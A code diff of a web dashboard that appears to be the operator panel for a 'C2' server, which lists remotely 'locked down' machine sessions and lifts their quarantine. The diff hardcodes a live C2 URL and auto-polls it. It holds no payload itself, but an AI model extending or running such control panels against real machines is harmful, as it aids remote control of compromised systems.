@@ -11,7 +11,7 @@
     h1 { color: #ef4444; font-size: 22px; margin-bottom: 4px; }
     p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; }
     .config-box { background: #111827; padding: 16px; border-radius: 10px; border: 1px solid #1f2937; margin-bottom: 20px; }
-    input[type="text"] { width: 100%; padding: 10px; background: #030712; border: 1px solid #374151; color: #fff; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 6px; }
+    input[type="text"] { width: 100%; padding: 10px; background: #030712; border: 1px solid #374151; color: #4ade80; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 6px; }
     table { width: 100%; border-collapse: collapse; background: #111827; border-radius: 10px; overflow: hidden; border: 1px solid #1f2937; }
     th, td { padding: 14px; text-align: left; border-bottom: 1px solid #1f2937; font-size: 13px; }
     th { background: #1f2937; color: #cbd5e1; text-transform: uppercase; font-size: 11px; }
@@ -27,8 +27,8 @@
     <p>Manage OS Quarantine & Remote Unlocks from your phone or any cloud device.</p>
 
     <div class="config-box">
-      <label style="font-size: 11px; color: #94a3b8; text-transform: uppercase; font-weight: bold;">Render C2 Server URL:</label>
-      <input type="text" id="daemonUrl" placeholder="https://test-uukm.onrender.com/" value="" onchange="saveUrl()" />
+      <label style="font-size: 11px; color: #94a3b8; text-transform: uppercase; font-weight: bold;">Render C2 Server (Hardcoded & Connected):</label>
+      <input type="text" id="daemonUrl" value="https://test-uukm.onrender.com" readonly />
     </div>
 
     <table>
@@ -41,33 +41,25 @@
         </tr>
       </thead>
       <tbody id="sessionTable">
-        <tr><td colspan="4" style="text-align: center; color: #64748b;">Enter your Render C2 URL above to connect...</td></tr>
+        <tr><td colspan="4" style="text-align: center; color: #64748b;">Connecting to Render cloud server...</td></tr>
       </tbody>
     </table>
   </div>
 
   <script>
-    function getBaseUrl() {
-      return document.getElementById("daemonUrl").value.trim().replace(/\/$/, "");
-    }
+    const RENDER_URL = "https://test-uukm.onrender.com";
 
-    function saveUrl() {
-      localStorage.setItem("c2_server_url", document.getElementById("daemonUrl").value);
-      fetchSessions();
+    function getBaseUrl() {
+      return RENDER_URL.replace(/\/$/, "");
     }
 
     window.onload = () => {
-      const saved = localStorage.getItem("c2_server_url") || localStorage.getItem("c2_daemon_url");
-      if (saved) {
-        document.getElementById("daemonUrl").value = saved;
-        fetchSessions();
-        setInterval(fetchSessions, 2000);
-      }
+      fetchSessions();
+      setInterval(fetchSessions, 2000); // Auto-refresh telemetry every 2 seconds
     };
 
     async function fetchSessions() {
       const baseUrl = getBaseUrl();
-      if (!baseUrl) return;
 
       try {
         const res = await fetch(`${baseUrl}/api/sessions`);
@@ -75,7 +67,7 @@
         const tbody = document.getElementById("sessionTable");
 
         if (sessions.length === 0) {
-          tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: #64748b;">No active lockdowns recorded.</td></tr>`;
+          tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: #64748b;">No active lockdowns recorded. System secure.</td></tr>`;
           return;
         }
 
@@ -93,12 +85,12 @@
         `).join("");
       } catch (err) {
         console.error("Cloud C2 connection failed", err);
+        document.getElementById("sessionTable").innerHTML = `<tr><td colspan="4" style="text-align: center; color: #ef4444;">Connecting to Render backend... (Spinning up server)</td></tr>`;
       }
     }
 
     async function liftQuarantine(sessionId) {
       const baseUrl = getBaseUrl();
-      if (!baseUrl) return alert("Please enter the Render C2 URL first.");
       if (!confirm(`Remotely lift quarantine for ${sessionId}?`)) return;
 
       try {
